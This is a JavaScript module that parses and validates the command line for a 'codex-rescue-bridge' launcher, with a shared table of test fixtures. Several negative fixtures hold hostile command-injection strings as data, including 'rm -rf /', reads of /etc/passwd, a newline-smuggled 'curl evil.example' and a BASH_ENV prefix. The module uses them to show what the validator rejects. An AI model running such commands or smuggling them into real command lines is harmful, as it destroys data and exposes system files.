/**
 * §3.2-d pinned argv grammar for the codex-rescue-bridge (§5: one shared
 * parser source for matcher and launcher; the exported FIXTURES table is
 * the single fixture suite PR-2's hook tests reuse).
 *
 *   invocation := NODE LAUNCHER [--last] prompt
 *   prompt     := '--prompt-file' PATH | '--' SINGLE_LINE_NONEMPTY_PROMPT
 *
 * Rules:
 *   - NODE and LAUNCHER are expansion-free literal tokens byte-equal to the
 *     registration-time canonical paths (a symlink literal, a tilde/glob/$VAR
 *     expansion, or a PATH-resolved name never byte-equals a canonical
 *     absolute literal — indirection dies here).
 *   - `--last` appears at most once, only in the slot shown.
 *   - the positional prompt is a single literal token, never empty, no
 *     newline, and MAY start with `-` (it reaches Codex via stdin, so it is
 *     data, never a flag).
 *   - PATH for --prompt-file is non-empty; containment is checked at match
 *     time by the PR-2 hook, not here.
 *   - unknown shapes fail closed with a machine-readable `reason`.
 */
import { lexCommand } from './lexer.mjs'

/** Example canonical anchor pair used by the shared fixture table. */
export const CANONICAL_NODE = '/usr/local/bin/node'
export const CANONICAL_LAUNCHER = '/opt/dsh-cc/cc-codex-bridge/scripts/codex-rescue-run.mjs'

const fail = (reason) => ({ ok: false, layer: 'argv', reason })
const ok = (value) => ({ ok: true, layer: 'argv', value })

/**
 * Parse a lexer-resolved argv (words with { text, expansion }) against the
 * pinned grammar. `node`/`launcher` are the byte-pinned canonical anchors.
 */
export function parseArgv(argv, { node, launcher }) {
  if (argv.length < 2) return fail('missing-anchor')
  if (argv[0].expansion) return fail('expansion-in-argv0')
  if (argv[1].expansion) return fail('expansion-in-argv1')
  if (argv[0].text !== node) return fail('argv0-byte-mismatch')
  if (argv[1].text !== launcher) return fail('argv1-byte-mismatch')
  let i = 2
  let last = false
  if (argv[i] !== undefined && argv[i].text === '--last') {
    last = true
    i++
  }
  const rest = argv.slice(i)
  if (rest.length === 0) return fail('missing-prompt')
  if (rest[0].text === '--prompt-file') {
    if (rest.length < 2 || rest[1].text === '') return fail('missing-prompt-file-path')
    if (rest.length > 2) return fail('trailing-arguments')
    return ok({ last, prompt: { kind: 'prompt-file', path: rest[1].text } })
  }
  if (rest[0].text !== '--') return fail('unexpected-token')
  if (rest.length < 2) return fail('missing-prompt')
  if (rest.length > 2) return fail('trailing-arguments')
  const prompt = rest[1].text
  if (prompt === '') return fail('empty-prompt')
  if (prompt.includes('\n')) return fail('prompt-newline')
  return ok({ last, prompt: { kind: 'inline', text: prompt } })
}

/**
 * Full matcher pipeline: lex the raw bash command to exactly one simple
 * command (§3.2-a), then pin its argv to the grammar (§3.2-d).
 */
export function matchInvocation(raw, { node = CANONICAL_NODE, launcher = CANONICAL_LAUNCHER } = {}) {
  const lex = lexCommand(raw)
  if (!lex.ok) return lex
  return parseArgv(lex.argv, { node, launcher })
}

/**
 * Shared fixture table (§5 one-shared-parser-source rule). Every row runs
 * through matchInvocation; positive rows pin the normalized parse, negative
 * rows carry `reason` = the violated rule. `layer` documents which layer
 * rejects (or accepts) the row; lexer-layer rows fail regardless of anchors.
 */
export const FIXTURES = [
  // ---- positive: pinned normalized shapes ----
  {
    name: 'inline prompt',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- "review the failing spec"`,
    ok: true,
    value: { last: false, prompt: { kind: 'inline', text: 'review the failing spec' } },
  },
  {
    name: 'inline prompt with --last in its only slot',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} --last -- "continue the rescue"`,
    ok: true,
    value: { last: true, prompt: { kind: 'inline', text: 'continue the rescue' } },
  },
  {
    name: 'prompt-file form',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} --prompt-file /tmp/prompts/p.txt`,
    ok: true,
    value: { last: false, prompt: { kind: 'prompt-file', path: '/tmp/prompts/p.txt' } },
  },
  {
    name: 'prompt-file form with --last',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} --last --prompt-file /tmp/prompts/p.txt`,
    ok: true,
    value: { last: true, prompt: { kind: 'prompt-file', path: '/tmp/prompts/p.txt' } },
  },
  {
    name: 'positional prompt may itself be --last (data after --)',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- --last`,
    ok: true,
    value: { last: false, prompt: { kind: 'inline', text: '--last' } },
  },
  {
    name: 'positional prompt may start with - (stdin handoff makes it data)',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- -restart-from-scratch`,
    ok: true,
    value: { last: false, prompt: { kind: 'inline', text: '-restart-from-scratch' } },
  },
  {
    name: 'quoted multi-word prompt is one token',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- 'multi word prompt'`,
    ok: true,
    value: { last: false, prompt: { kind: 'inline', text: 'multi word prompt' } },
  },
  {
    name: 'command substitution inside single quotes is pure data',
    layer: 'lexer',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- '$(rm -rf /)'`,
    ok: true,
    value: { last: false, prompt: { kind: 'inline', text: '$(rm -rf /)' } },
  },
  {
    name: 'hostile install path survives as concatenated quoted word',
    layer: 'argv',
    // The POSIX single-quote escape `'\''` needs `\\''` in a JS template
    // literal: a lone `\` is swallowed (collapses to `''`, an empty quoted
    // segment), which would lex the path to "quotes", not "quote's".
    input: `${CANONICAL_NODE} '/opt/dsh space/quote'\\''s/cc-codex-bridge/scripts/codex-rescue-run.mjs' -- p`,
    launcher: '/opt/dsh space/quote\'s/cc-codex-bridge/scripts/codex-rescue-run.mjs',
    ok: true,
    value: { last: false, prompt: { kind: 'inline', text: 'p' } },
  },
  // ---- negative: lexer layer (§3.2-a) ----
  {
    name: 'unquoted semicolon (compound command)',
    layer: 'lexer',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- p; rm -rf /`,
    ok: false,
    reason: 'unquoted-operator',
  },
  {
    name: 'unquoted && (compound command)',
    layer: 'lexer',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- p && echo owned`,
    ok: false,
    reason: 'unquoted-operator',
  },
  {
    name: 'unquoted || (compound command)',
    layer: 'lexer',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- p || echo fallback`,
    ok: false,
    reason: 'unquoted-operator',
  },
  {
    name: 'unquoted pipe',
    layer: 'lexer',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- p | tee /tmp/leak`,
    ok: false,
    reason: 'unquoted-operator',
  },
  {
    name: 'unquoted redirect out',
    layer: 'lexer',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- p > /tmp/out`,
    ok: false,
    reason: 'unquoted-operator',
  },
  {
    name: 'unquoted redirect in',
    layer: 'lexer',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- p < /etc/passwd`,
    ok: false,
    reason: 'unquoted-operator',
  },
  {
    name: 'unquoted newline (second command on next line)',
    layer: 'lexer',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- p\ncurl evil.example`,
    ok: false,
    reason: 'unquoted-operator',
  },
  {
    name: 'env-assignment prefix',
    layer: 'lexer',
    input: `BASH_ENV=/tmp/x ${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- p`,
    ok: false,
    reason: 'env-assignment-prefix',
  },
  {
    name: 'unquoted $() command substitution',
    layer: 'lexer',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- $(echo p)`,
    ok: false,
    reason: 'command-substitution-unquoted',
  },
  {
    name: 'unquoted backtick command substitution',
    layer: 'lexer',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- \`echo p\``,
    ok: false,
    reason: 'command-substitution-unquoted',
  },
  {
    name: '$() inside double quotes (bash evaluates it)',
    layer: 'lexer',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- "$(echo p)"`,
    ok: false,
    reason: 'command-substitution-double-quoted',
  },
  {
    name: 'backticks inside double quotes',
    layer: 'lexer',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- "\`echo p\`"`,
    ok: false,
    reason: 'command-substitution-double-quoted',
  },
  {
    name: 'unclosed quote',
    layer: 'lexer',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- 'p`,
    ok: false,
    reason: 'unclosed-quote',
  },
  // ---- negative: expansion-bearing anchor tokens (§3.2-b) ----
  {
    name: 'tilde expansion in argv[0]',
    layer: 'argv',
    input: `~/bin/node ${CANONICAL_LAUNCHER} -- p`,
    ok: false,
    reason: 'expansion-in-argv0',
  },
  {
    name: 'glob expansion in launcher path',
    layer: 'argv',
    input: `${CANONICAL_NODE} /opt/dsh-cc/*/scripts/codex-rescue-run.mjs -- p`,
    ok: false,
    reason: 'expansion-in-argv1',
  },
  {
    name: '$VAR expansion in argv[0]',
    layer: 'argv',
    input: `$NODE_BIN ${CANONICAL_LAUNCHER} -- p`,
    ok: false,
    reason: 'expansion-in-argv0',
  },
  // ---- negative: argv layer (§3.2-b/d) ----
  {
    name: 'forged launcher path (absolute but not the anchor)',
    layer: 'argv',
    input: `${CANONICAL_NODE} /tmp/evil/scripts/codex-rescue-run.mjs -- p`,
    ok: false,
    reason: 'argv1-byte-mismatch',
  },
  {
    name: 'PATH-trampoline interpreter bare name',
    layer: 'argv',
    input: `node ${CANONICAL_LAUNCHER} -- p`,
    ok: false,
    reason: 'argv0-byte-mismatch',
  },
  {
    name: 'symlink-literal anchor (bytes differ from the canonical launcher)',
    layer: 'argv',
    input: `${CANONICAL_NODE} /tmp/link-to-codex-rescue-run.mjs -- p`,
    ok: false,
    reason: 'argv1-byte-mismatch',
  },
  {
    name: 'duplicate --last',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} --last --last -- p`,
    ok: false,
    reason: 'unexpected-token',
  },
  {
    name: 'misplaced --last after the prompt',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- p --last`,
    ok: false,
    reason: 'trailing-arguments',
  },
  {
    name: 'misplaced --last alone (no prompt)',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} --last`,
    ok: false,
    reason: 'missing-prompt',
  },
  {
    name: 'no prompt at all',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER}`,
    ok: false,
    reason: 'missing-prompt',
  },
  {
    name: 'empty positional prompt',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- ""`,
    ok: false,
    reason: 'empty-prompt',
  },
  {
    name: '-- with no prompt token',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} --`,
    ok: false,
    reason: 'missing-prompt',
  },
  {
    name: 'newline-bearing positional prompt',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- "line one\nline two"`,
    ok: false,
    reason: 'prompt-newline',
  },
  {
    name: 'unknown flag before the prompt',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} --json -- p`,
    ok: false,
    reason: 'unexpected-token',
  },
  {
    name: '--prompt-file without a path',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} --prompt-file`,
    ok: false,
    reason: 'missing-prompt-file-path',
  },
  {
    name: '--prompt-file with empty path',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} --prompt-file ""`,
    ok: false,
    reason: 'missing-prompt-file-path',
  },
  {
    name: '--prompt-file with trailing arguments',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} --prompt-file /tmp/p.txt -- q`,
    ok: false,
    reason: 'trailing-arguments',
  },
  {
    name: 'positional prompt with trailing extra argument',
    layer: 'argv',
    input: `${CANONICAL_NODE} ${CANONICAL_LAUNCHER} -- p extra`,
    ok: false,
    reason: 'trailing-arguments',
  },
]
